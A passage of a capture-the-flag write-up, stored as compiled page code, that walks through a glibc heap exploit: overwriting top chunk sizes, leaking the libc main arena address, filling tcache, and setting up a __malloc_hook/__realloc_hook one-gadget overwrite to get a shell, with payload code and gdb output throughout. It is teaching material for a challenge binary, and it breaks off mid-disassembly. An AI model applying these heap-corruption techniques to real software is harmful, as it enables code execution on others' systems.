size\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# chunk data\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x8\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Prevsize\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xd51\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Malloc 0x1000 bytes\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"After overwrite top chunk size:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x0000564641e852a0-0x10\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85290: 0x0000000000000000  0x0000000000000021\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852a0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852b0: 0x0000000000000000  0x0000000000000d51\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852c0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852d0: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"After \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x0000564641e852a0-0x10\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85290: 0x0000000000000000  0x0000000000000021\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852a0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852b0: 0x0000000000000000  0x0000000000000d31\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852c0: 0x00007fb00a6b0be0  0x00007fb00a6b0be0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852d0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  heap bin\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Tcachebins for thread 1 \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`All tcachebins are empty\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Fastbins for arena 0x7fb00a6b0b80 \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=0, size=0x20] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=1, size=0x30] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=2, size=0x40] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=3, size=0x50] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=4, size=0x60] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=5, size=0x70] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=6, size=0x80] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Unsorted Bin for arena 'main_arena' \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] unsorted_bins[0]: fw=0x564641e852b0, bk=0x564641e852b0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:` \\u2192   Chunk(addr=0x564641e852c0, size=0xd30, flags=PREV_INUSE)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Found 1 chunks in unsorted bin.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Small Bins for arena 'main_arena' \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Found 0 chunks in 0 small non-empty bins.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Large Bins for arena 'main_arena' \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Found 0 chunks in 0 large non-empty bins.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can see that the top chunk is freed and goes into unsorted bin. At here, the program write libc main arena to that chunk so we can see stuff at that freed top chunk. The address for the \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\" is placed in the next page and saved in the stack like this:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571be0\\u2502+0x0000: \"B=malloc(4096)\\\\n\"   \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571be8\\u2502+0x0008: \"(4096)\\\\n\"\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571bf0\\u2502+0x0010: 0x0000564641e852a0  \\u2192  0x0000000000000000    \u003c-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571bf8\\u2502+0x0018: 0x0000564641ea6010  \\u2192  0x0000000000000000    \u003c-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c00\\u2502+0x0020: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c08\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c10\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c18\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So now, let\\u2019s leak the libc main arena address in the freed top chunk first. To do that, we just simply malloc an amount which is smaller than freed top chunk (which turn into unsorted bin) because malloc() doesn\\u2019t remove data on that chunk (just free() does), and then print the libc main arena address out (Address changed because I rerun it):\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(2, 0x100)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`puts(2)\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Running it and we get the libc main arena address leaked:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/libc_main_arena_address_leaked.png\",alt:\"libc_main_arena_address_leaked.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Stack contain the chunk with index 2:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bc90\\u2502+0x0000: \"puts(C)\\\\n\"  \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bc98\\u2502+0x0008: 0x00000a2936353200\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bca0\\u2502+0x0010: 0x0000555ddbd4f2a0  \\u2192  0x0000000000000000    \u003c-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bca8\\u2502+0x0018: 0x0000555ddbd70010  \\u2192  0x0000000000000000    \u003c-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bcb0\\u2502+0x0020: 0x0000555ddbd4f2c0  \\u2192  0x00007f416cfea1e0    \u003c-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bcb8\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bcc0\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bcc8\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Compared with chunk 2 data and we know it\\u2019s correct. Now we will do a simple calculation to get the offset between that leaked address with libc base address. We can get libc base address using \",(0,e.jsx)(n.code,{children:\"vmmap\"}),\" (for gdb-gef I think so)\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/vmmap_libc_base.png\",alt:\"vmmap_libc_base.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So the libc base address is \",(0,e.jsx)(n.code,{children:\"0x00007f416cdfe000\"}),\", the leaked address is \",(0,e.jsx)(n.code,{children:\"0x00007f416cfea1e0\"}),\", the offset will be:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007f416cfea1e0 - 0x00007f416cdfe000 = 0x1ec1e0\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"So every time we get the leaked libc main arena address, we just subtract with this offset and we have the libc base address. That\\u2019s great for now! Let\\u2019s move on the second stage: Free 2 small chunks!\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-2-free-2-small-chunks\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-2-free-2-small-chunks\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 2: Free 2 small chunks\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Now, we will continue using the above technique to free 2 top chunk with small size. Do you still remember we have already chunk index 1 which in the new page of heap? This time, we will reuse that to overwrite the new top chunk size again.\"}),`\n`,(0,e.jsx)(n.p,{children:\"Before we do that, let\\u2019s see the new top chunk size next to chunk 1. Because I re-run program so address changed. This is new stack address:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d0\\u2502+0x0000: \"puts(C)\\\\n\"  \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d8\\u2502+0x0008: 0x00000a2936353200\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e0\\u2502+0x0010: 0x0000557c12fa02a0  \\u2192  0x0000000000000000    \u003c-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e8\\u2502+0x0018: 0x0000557c12fc1010  \\u2192  0x0000000000000000    \u003c-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f0\\u2502+0x0020: 0x0000557c12fa02c0  \\u2192  0x00007f5c373161e0    \u003c-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007fffcd05f248\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007fffcd05f250\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007fffcd05f258\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So new top chunk size now is:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  # x/4xg \u003cchunk index 1\u003e + 0x1000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/4xg 0x000055cb4beae010 + 0x1000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fc2010: 0x0000000000000000  0x0000000000020ff1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fc2020: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We need to make top chunk size smaller such as 0x300, so we need to malloc another chunk with the size \",(0,e.jsx)(n.code,{children:\"0xcf0\"}),\" with this calculation:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`0xff1 - 0x300 - 0xcf1\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will want to malloc \",(0,e.jsx)(n.code,{children:\"0xcf0-0x10\"}),\" because there is heap metadata, so if we \",(0,e.jsx)(n.code,{children:\"malloc(0xcf0)\"}),\", the total size will be \",(0,e.jsx)(n.code,{children:\"0xcf0 + 0x10 = 0xd00\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(1, 0xcf0-0x10)\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Why I use index 1? Just because we don\\u2019t use those 0x1000 byte of chunk 1 anymore so we reuse index 1 again. After \",(0,e.jsx)(n.code,{children:\"malloc(1, 0xcf0-0x10)\"}),\", the stack where chunk 1 is placed changed:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d0\\u2502+0x0000: \"B=malloc(3296)\\\\n\"   \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d8\\u2502+0x0008: \"(3296)\\\\n\"\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e0\\u2502+0x0010: 0x0000557c12fa02a0  \\u2192  0x0000000000000000    \u003c-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e8\\u2502+0x0018: 0x0000557c12fc2020  \\u2192  0x0000000000000000    \u003c-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f0\\u2502+0x0020: 0x0000557c12fa02c0  \\u2192  0x00007f5c373161e0    \u003c-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f8\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f500\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f508\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Let\\u2019s check if our top chunk size if changed correctly:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/4xg 0x0000557c12fc2020 + (0xcf0 - 0x10)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fc2d00: 0x0000000000000000  0x0000000000020301\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fc2d10: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So now we just need to change top chunk size, then \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\" again and we have a 0x300-byte chunk is freed:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x301\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"               \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Remember PREV_INUSE bit\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Do you notice why I use chunk 2 to trigger to free top chunk? Because after we trigger that, the top chunk will go to tcache. So with the remain of chunk 1 address, we can control the freed top chunk.\"}),`\n`,(0,e.jsx)(n.p,{children:\"Running script and we get our first freed chunk in tcache:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/free_topchunk_into_tcache1.png\",alt:\"free_topchunk_into_tcache1.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"So with the chunk 2, we will do the same as chunk 1 to get the second freed chunk:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size to 0x20300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Overwrite top chunk size to 0x300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x301\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And we get the second freed chunk in tcache:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/free_topchunk_into_tcache2.png\",alt:\"free_topchunk_into_tcache2.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"With 2 freed chunk in tcache, we are very closed to the shell. Let\\u2019s move on final stage: Get shell!\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-3-get-shell\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-3-get-shell\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 3: Get shell\"]}),`\n`,(0,e.jsx)(n.p,{children:\"This time, we will abuse tcache link list by changing forward pointer to whatever place we want. But first, let\\u2019s find a one gadget that we can use:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/one_gadget.png\",alt:\"one_gadget.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will use the first one, which has constraints is r15 and r12 is null. Because if we changed \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" once, it can hardly be recovered to malloc() again. So this is a one hit one kill situation.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The idea is to overwrite \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" with realloc() and overwrite \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" with one gadget. The aim is to \",(0,e.jsx)(n.code,{children:\"pop\"}),\" null byte to r15 and r12. At the epilouge of realloc(), there is \",(0,e.jsx)(n.code,{children:\"pop r12\"}),\" and \",(0,e.jsx)(n.code,{children:\"pop r15\"}),\". So that\\u2019s why we will jump to realloc first. This is the assembly code of realloc:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  disas realloc\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function __GI___libc_realloc:\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8000 \u003c+0\u003e:   endbr64\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8004 \u003c+4\u003e:   push   r15\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   